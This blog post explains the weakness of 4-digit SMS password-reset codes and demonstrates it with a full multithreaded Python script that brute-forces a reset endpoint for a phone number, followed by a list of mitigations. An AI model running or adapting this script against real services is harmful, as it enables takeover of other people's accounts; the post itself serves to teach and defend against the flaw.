---
title: "Security Issues with SMS Verification Code Strength in Password Recovery"
author: "ZhgChgLi"
date: 2021-03-14T15:57:38.256+0000
last_modified_at: 2024-04-13T16:30:08.749+0000
categories: ["ZRealm Dev."]
tags: ["ios-app-development","hacker","web-security","password-security","security-token"]
description: "Demonstrating the severity of brute-force attacks using Python"
image:
  path: /assets/99a6cef90190/1*xtbLIfJ6KELkGYeVCnzSFg.jpeg
render_with_liquid: false
---

### Security Issues with SMS Verification Code Strength in Password Recovery

Demonstrating the severity of brute-force attacks using Python



![Photo by [Matt Artz](https://unsplash.com/@mattartz?utm_source=unsplash&utm_medium=referral&utm_content=creditCopyText){:target="_blank"}](/assets/99a6cef90190/1*xtbLIfJ6KELkGYeVCnzSFg.jpeg)

Photo by [Matt Artz](https://unsplash.com/@mattartz?utm_source=unsplash&utm_medium=referral&utm_content=creditCopyText){:target="_blank"}
### Introduction

This article does not contain much technical content related to information security; it is simply a spontaneous thought that arose while using a certain platform's website. I thought I would test the security, and I discovered some issues.

When using the password recovery feature on websites or APP services, there are generally two options: one is to enter the account or email, after which a link to a password reset page containing a token will be sent to the email. Clicking on the link opens the page to reset the password, which is not problematic unless there are design flaws as mentioned in [the previous article](../142244e5f07a/).

The other method for password recovery is to enter the bound mobile phone number (mostly used in APP services), after which an SMS verification code will be sent to the phone. Once the verification code is entered, the password can be reset. However, for convenience, most services use pure numbers as verification codes. Additionally, since iOS ≥ 11 introduced the [Password AutoFill](../948ed34efa09/) feature, when the phone receives the verification code, the keyboard automatically detects it and prompts the user.

![](/assets/99a6cef90190/1*f7frmgNsLwW1Q9e9QtAt1A.png)

According to the [official documentation](https://developer.apple.com/documentation/security/password_autofill/about_the_password_autofill_workflow){:target="_blank"}, Apple has not provided the format rules for automatic filling of verification codes. However, I have observed that almost all services that support auto-fill use pure numbers, suggesting that only numbers can be used and not complex combinations of numbers and letters.
### Issues

Due to the possibility of brute-force attacks on numeric passwords, especially 4-digit passwords, the combinations range from 0000 to 9999, totaling 10,000 combinations. Using multiple threads and machines can facilitate grouped brute-force attacks.

Assuming the verification request requires a 0.1-second response time, for 10,000 combinations = 10,000 requests
```
Time required for cracking attempts: ((10,000 * 0.1) / number of threads) seconds
```

Even without using threads, it would only take about 16 minutes to try and find the correct SMS verification code.


> _In addition to insufficient password length and complexity, there are two other issues: the lack of a limit on the number of attempts for the verification code and an excessively long validity period._ 




### Combinations

In summary, this security issue is commonly found on the APP side; web services usually implement CAPTCHA verification after multiple failed attempts or require additional security questions when requesting a password reset, increasing the difficulty of sending verification requests. Additionally, if the web service's verification does not separate the front and back end, each verification request must retrieve the entire webpage, extending the request response time.

On the APP side, due to process design and user convenience, the password reset process is often simplified. Some APPs even allow login through mobile number verification; if there is no protection on the API side, it can lead to security vulnerabilities.
### Practice


> ⚠️Warning⚠️ This article is solely to demonstrate the severity of this security issue; please do not use it for malicious purposes. 



#### Sniffing Verification Request API

Everything starts with sniffing, and this part can refer to previous articles " [APP uses HTTPS for transmission, but data is still stolen.](../46410aaada00/) " and " [Using Python + Google Cloud Platform + Line Bot to automate routine tasks](../70a1409b149a/) ". For understanding the principles, I recommend using the [Proxyman](https://proxyman.io/){:target="_blank"} tool mentioned in the second article for sniffing.

```markdown
![](/assets/99a6cef90190/1*22uVkKdpDXnwEygDa9lwyA.png)

If it is a front-end and back-end separated website service, you can also use Chrome -> Inspect -> Network -> View what requests were made after submitting the verification code.

![](/assets/99a6cef90190/1*Skm69eJiZKeK4_QUU0wIoQ.png)

**Assuming the verification code request received is:**
```
POST https://zhgchg.li/findPWD
```

**Response:**
```
{
   "status": false,
   "msg": "Verification error"
}
```
#### Writing a Brute Force Python Script

crack.py:
```python
import random
import requests
import json
import threading

phone = "0911111111"
found = False
def crack(start, end):
    global found
    for code in range(start, end):
        if found:
            break
        
        stringCode = str(code).zfill(4)
        data = {
            "phone": phone,
            "code": stringCode
        }

        headers = {}
        try:
            request = requests.post('https://zhgchg.li/findPWD', data=data, headers=headers)
            result = json.loads(request.content)
            if result["status"] == True:
                print("Code is:" + stringCode)
                found = True
                break
            else:
                print("Code " + stringCode + " is wrong.")
        except Exception as e:
            print("Code " + stringCode + " exception error (" + str(e) + ")")

def main():
    codeGroups = [
        [0, 1000], [1000, 2000], [2000, 3000], [3000, 4000], [4000, 5000],
        [5000, 6000], [6000, 7000], [7000, 8000], [8000, 9000], [9000, 10000]
    ]
    for codeGroup in codeGroups:
        t = threading.Thread(target=crack, args=(codeGroup[0], codeGroup[1],))
        t.start()

main()
```

After running the script, we get:

![](/assets/99a6cef90190/1*jGp69g9H1BjLqq6SdIHRBw.png)

```
The verification code is: 1743
```

Use `1743` to reset the password, change the original password, or log in directly to the account.

> Bigo!

### Solutions
- Increase more information verification for password resets (e.g., birthday, security questions)
- Increase the length of the verification code (e.g., Apple 6-digit numbers), increase the complexity of the verification code (if it does not affect AutoFill functionality)
- Make the verification code invalid after more than 3 incorrect attempts, requiring the user to resend the verification code
- Shorten the validity period of the verification code
- Lock the device after too many incorrect attempts of the verification code, add CAPTCHA
- Implement SSL Pinning in the app, encrypt and decrypt transmissions (to prevent sniffing)

### Further Reading
- [Revealing a clever website vulnerability discovered a few years ago](../142244e5f07a/)
- [How to create an interesting engineering CTF competition](../729d7b6817a4/)
- [The app uses HTTPS for transmission, but data was still stolen.](../46410aaada00/)
- [Using Python + Google Cloud Platform + Line Bot to automate routine tasks](../70a1409b149a/)
```

If you have any questions or suggestions, feel free to [contact me](https://www.zhgchg.li/contact){:target="_blank"}.

_[Post](https://medium.com/zrealm-ios-dev/%E6%89%BE%E5%9B%9E%E5%AF%86%E7%A2%BC%E4%B9%8B%E7%B0%A1%E8%A8%8A%E9%A9%97%E8%AD%89%E7%A2%BC%E5%BC%B7%E5%BA%A6%E5%AE%89%E5%85%A8%E5%95%8F%E9%A1%8C-99a6cef90190){:target="_blank"} converted from Medium by [ZMediumToMarkdown](https://github.com/ZhgChgLi/ZMediumToMarkdown){:target="_blank"}._
